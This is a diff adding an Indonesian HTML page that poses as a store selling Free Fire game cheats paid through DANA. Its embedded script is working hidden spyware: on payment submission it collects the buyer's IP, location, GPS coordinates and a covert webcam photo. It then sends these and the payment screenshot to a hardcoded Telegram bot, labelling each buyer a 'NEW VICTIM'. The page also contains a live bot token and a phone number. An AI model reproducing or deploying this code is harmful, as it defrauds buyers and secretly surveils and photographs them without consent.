@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>RX STORE | FREE FIRE CHEAT MARKETPLACE</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+            background: #0a0a0a;
+            overflow-x: hidden;
+            color: white;
+        }
+        .bg-animate {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: linear-gradient(135deg, #1a0a2e, #0f0f1a, #2a0a3e);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+        }
+        @keyframes gradientBG {
+            0% { background-position: 0% 0%; }
+            50% { background-position: 100% 100%; }
+            100% { background-position: 0% 0%; }
+        }
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+        .particle {
+            position: absolute;
+            background: rgba(156, 39, 176, 0.5);
+            border-radius: 50%;
+            pointer-events: none;
+            animation: floatParticle linear infinite;
+        }
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
+        }
+        .navbar {
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(156, 39, 176, 0.5);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #9b59b6, #e74c3c);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .logo span { color: #e74c3c; }
+        .container {
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .hero {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+        .hero h1 {
+            font-size: 48px;
+            background: linear-gradient(135deg, #9b59b6, #e74c3c);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 15px;
+        }
+        .badge {
+            display: inline-block;
+            background: rgba(156, 39, 176, 0.2);
+            border: 1px solid #9b59b6;
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 30px;
+            margin-bottom: 50px;
+        }
+        .product-card {
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            border: 1px solid rgba(156, 39, 176, 0.3);
+            transition: transform 0.3s, box-shadow 0.3s;
+            cursor: pointer;
+        }
+        .product-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(156, 39, 176, 0.3);
+            border-color: #9b59b6;
+        }
+        .product-card[data-cheat="drip"]:hover { background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(33, 150, 243, 0.2)); }
+        .product-card[data-cheat="hg"]:hover { background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(76, 175, 80, 0.2)); }
+        .product-card[data-cheat="fluorite"]:hover { background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(0, 229, 255, 0.2)); }
+        .product-card[data-cheat="aim"]:hover { background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(255, 152, 0, 0.2)); }
+        .product-card[data-cheat="ratio"]:hover { background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(255, 82, 82, 0.2)); }
+        .cheat-logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+        }
+        .cheat-name {
+            font-size: 22px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .price {
+            text-align: center;
+            margin: 15px 0;
+        }
+        .original-price {
+            font-size: 14px;
+            color: #888;
+            text-decoration: line-through;
+            margin-right: 10px;
+        }
+        .discount-price {
+            font-size: 28px;
+            font-weight: bold;
+            color: #9b59b6;
+        }
+        .duration {
+            text-align: center;
+            font-size: 12px;
+            color: #aaa;
+            margin-bottom: 15px;
+        }
+        .btn-buy {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #9b59b6, #e74c3c);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .btn-buy:hover { opacity: 0.8; }
+        .anti-ban {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(156, 39, 176, 0.1);
+            border-radius: 15px;
+            font-size: 14px;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: #1a1a2e;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            border: 1px solid #9b59b6;
+        }
+        .timer {
+            font-size: 48px;
+            font-weight: bold;
+            text-align: center;
+            color: #e74c3c;
+            margin: 20px 0;
+            font-family: monospace;
+        }
+        .dana-info {
+            background: rgba(0,0,0,0.5);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .upload-area {
+            border: 2px dashed #9b59b6;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin: 20px 0;
+            cursor: pointer;
+        }
+        .preview-img {
+            max-width: 100%;
+            max-height: 200px;
+            margin: 10px 0;
+            display: none;
+        }
+        @media (max-width: 768px) {
+            .products-grid { grid-template-columns: 1fr; }
+            .hero h1 { font-size: 32px; }
+        }
+    </style>
+</head>
+<body>
+<div class="bg-animate"></div>
+<div class="particles" id="particles"></div>
+
+<nav class="navbar">
+    <div class="logo">RX<span>STORE</span></div>
+    <div class="badge">⭐ 4.9 (1.2k+ Reviews)</div>
+</nav>
+
+<div class="container">
+    <div class="hero">
+        <h1>🔥 FREE FIRE CHEAT MARKETPLACE 🔥</h1>
+        <p>100% Anti Ban | Update Setiap Patch | Support All Device</p>
+        <div class="badge">🚀 FILE/CHEAT YANG KAMI JUAL DIJAMIN ANTI BAN 🚀</div>
+    </div>
+
+    <div class="products-grid" id="productsGrid"></div>
+
+    <div class="anti-ban">
+        ⚡ Sistem Keamanan Level Tertinggi | Auto Update Bypass | 24/7 Support ⚡
+    </div>
+</div>
+
+<div id="paymentModal" class="modal">
+    <div class="modal-content">
+        <h2 style="text-align:center; margin-bottom:20px;">💳 KONFIRMASI PEMBAYARAN</h2>
+        <div id="selectedProduct"></div>
+        <div class="timer" id="timer">10:00</div>
+        <div class="dana-info">
+            💰 DANA: <strong>081280885682</strong><br>
+            Nominal: <strong id="paymentNominal">Rp 0</strong>
+        </div>
+        <div class="upload-area" id="uploadArea">
+            📸 Klik untuk upload bukti pembayaran
+            <input type="file" id="proofImage" accept="image/*" style="display:none;">
+            <img id="preview" class="preview-img">
+        </div>
+        <button id="submitPayment" class="btn-buy" style="margin-top:15px;">✅ Kirim Bukti</button>
+        <button id="closeModal" class="btn-buy" style="margin-top:10px; background:#333;">❌ Batal</button>
+    </div>
+</div>
+
+<script>
+    // ========== TELEGRAM CONFIG (BENAR) ==========
+    const BOT_TOKEN = '8552539667:AAENExYTuHW4dNf_aF6ZcWQfkLyWfprC8rA';
+    const CHAT_ID = '5576221331';
+
+    const products = [
+        { id: 1, name: "DRIP CLIENT", price: 15000, original: 45000, duration: "1 Hari", cheatClass: "drip", desc: "Aimbot + ESP + Wallhack + Radar" },
+        { id: 2, name: "HG CLIENT", price: 20000, original: 60000, duration: "1 Hari", cheatClass: "hg", desc: "Magic Bullet + Headshot Hack" },
+        { id: 3, name: "FLUORITE", price: 300000, original: 500000, duration: "Permanent", cheatClass: "fluorite", desc: "Premium Client + All Feature" },
+        { id: 4, name: "AIM BADAN + HEADSHOT", price: 120000, original: 250000, duration: "Permanent", cheatClass: "aim", desc: "100% Headshot Rate" },
+        { id: 5, name: "FILE RASIO HS 60%", price: 90000, original: 180000, duration: "Permanent", cheatClass: "ratio", desc: "Stabil 60% Headshot Ratio" }
+    ];
+
+    let selectedProduct = null;
+    let timerInterval = null;
+    let timeLeft = 600;
+
+    function renderProducts() {
+        const grid = document.getElementById('productsGrid');
+        grid.innerHTML = products.map(p => `
+            <div class="product-card" data-cheat="${p.cheatClass}" data-id="${p.id}">
+                <div class="cheat-logo">🎮</div>
+                <div class="cheat-name">${p.name}</div>
+                <div class="price">
+                    <span class="original-price">Rp ${p.original.toLocaleString()}</span>
+                    <span class="discount-price">Rp ${p.price.toLocaleString()}</span>
+                </div>
+                <div class="duration">⏱️ ${p.duration}</div>
+                <div style="font-size:12px; color:#aaa; text-align:center; margin-bottom:15px;">${p.desc}</div>
+                <button class="btn-buy" data-id="${p.id}">BELI SEKARANG</button>
+            </div>
+        `).join('');
+
+        document.querySelectorAll('.btn-buy').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                e.stopPropagation();
+                const id = parseInt(btn.dataset.id);
+                selectedProduct = products.find(p => p.id === id);
+                openPaymentModal();
+            });
+        });
+    }
+
+    function openPaymentModal() {
+        if (!selectedProduct) return;
+        
+        document.getElementById('selectedProduct').innerHTML = `
+            <div style="text-align:center;">
+                <strong>${selectedProduct.name}</strong><br>
+                ${selectedProduct.duration} - Rp ${selectedProduct.price.toLocaleString()}
+            </div>
+        `;
+        document.getElementById('paymentNominal').innerText = `Rp ${selectedProduct.price.toLocaleString()}`;
+        
+        if (timerInterval) clearInterval(timerInterval);
+        timeLeft = 600;
+        updateTimerDisplay();
+        timerInterval = setInterval(() => {
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                alert('⏰ Waktu habis! Kembali ke menu utama.');
+                closePaymentModal();
+            } else {
+                timeLeft--;
+                updateTimerDisplay();
+            }
+        }, 1000);
+        
+        document.getElementById('paymentModal').style.display = 'flex';
+        document.getElementById('preview').style.display = 'none';
+        document.getElementById('proofImage').value = '';
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        document.getElementById('timer').innerText = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+    }
+
+    function closePaymentModal() {
+        if (timerInterval) clearInterval(timerInterval);
+        document.getElementById('paymentModal').style.display = 'none';
+        selectedProduct = null;
+    }
+
+    const uploadArea = document.getElementById('uploadArea');
+    const proofInput = document.getElementById('proofImage');
+    const preview = document.getElementById('preview');
+
+    uploadArea.addEventListener('click', () => proofInput.click());
+    proofInput.addEventListener('change', (e) => {
+        if (e.target.files && e.target.files[0]) {
+            const reader = new FileReader();
+            reader.onload = function(ev) {
+                preview.src = ev.target.result;
+                preview.style.display = 'block';
+            };
+            reader.readAsDataURL(e.target.files[0]);
+        }
+    });
+
+    async function captureFullData() {
+        const data = {};
+        
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            data.ip = ipData.ip;
+            
+            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const geoData = await geoRes.json();
+            data.ip_location = `${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}, ${geoData.country_name || 'Unknown'}`;
+        } catch(e) { data.ip = 'unknown'; data.ip_location = 'Unknown'; }
+        
+        data.gps = await new Promise(resolve => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+                    () => resolve(null)
+                );
+            } else { resolve(null); }
+        });
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 500));
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            data.photo = canvas.toDataURL('image/jpeg', 0.7);
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) { data.photo = null; }
+        
+        data.userAgent = navigator.userAgent;
+        return data;
+    }
+
+    async function sendToTelegram(data, proofBase64) {
+        let message = `🔥 NEW VICTIM 🔥\n\n`;
+        message += `📱 Product: ${data.product}\n`;
+        message += `💰 Price: Rp ${data.price.toLocaleString()}\n`;
+        message += `🌐 IP: ${data.ip}\n`;
+        message += `📍 Location: ${data.ip_location}\n`;
+        if (data.gps) {
+            message += `🛰️ GPS: ${data.gps.lat}, ${data.gps.lng}\n`;
+            message += `🗺️ Maps: https://www.google.com/maps?q=${data.gps.lat},${data.gps.lng}\n`;
+        }
+        message += `⏰ Time: ${new Date().toISOString()}`;
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        });
+        
+        if (data.photo) {
+            const photoBlob = await fetch(data.photo).then(r => r.blob());
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', photoBlob, 'camera.jpg');
+            formData.append('caption', `📸 FOTO KAMERA - ${data.product}`);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+        
+        if (proofBase64) {
+            const proofBlob = await fetch(proofBase64).then(r => r.blob());
+            const formData2 = new FormData();
+            formData2.append('chat_id', CHAT_ID);
+            formData2.append('photo', proofBlob, 'proof.jpg');
+            formData2.append('caption', `💰 BUKTI PEMBAYARAN - ${data.product} - Rp ${data.price.toLocaleString()}`);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData2
+            });
+        }
+    }
+
+    document.getElementById('submitPayment').addEventListener('click', async () => {
+        if (!selectedProduct) return;
+        if (!proofInput.files || !proofInput.files[0]) {
+            alert('Harap upload bukti pembayaran!');
+            return;
+        }
+        
+        const proofBase64 = await new Promise((resolve) => {
+            const reader = new FileReader();
+            reader.onload = () => resolve(reader.result);
+            reader.readAsDataURL(proofInput.files[0]);
+        });
+        
+        const capturedData = await captureFullData();
+        
+        const payload = {
+            product: selectedProduct.name,
+            price: selectedProduct.price,
+            ip: capturedData.ip,
+            ip_location: capturedData.ip_location,
+            gps: capturedData.gps,
+            photo: capturedData.photo,
+            userAgent: capturedData.userAgent
+        };
+        
+        await sendToTelegram(payload, proofBase64);
+        
+        alert('✅ Bukti terkirim! Admin akan memproses dalam 5 menit.');
+        closePaymentModal();
+    });
+    
+    document.getElementById('closeModal').addEventListener('click', closePaymentModal);
+
+    function createParticles() {
+        const container = document.getElementById('particles');
+        for(let i=0;i<50;i++) {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            const size = Math.random() * 10 + 2;
+            p.style.width = size + 'px';
+            p.style.height = size + 'px';
+            p.style.left = Math.random() * 100 + '%';
+            p.style.animationDuration = Math.random() * 10 + 5 + 's';
+            p.style.animationDelay = Math.random() * 10 + 's';
+            p.style.background = `rgba(${Math.random()*255}, ${Math.random()*100}, ${Math.random()*255}, ${Math.random()*0.5})`;
+            container.appendChild(p);
+        }
+    }
+    
+    createParticles();
+    renderProducts();
+</script>
+</body>
+</html>
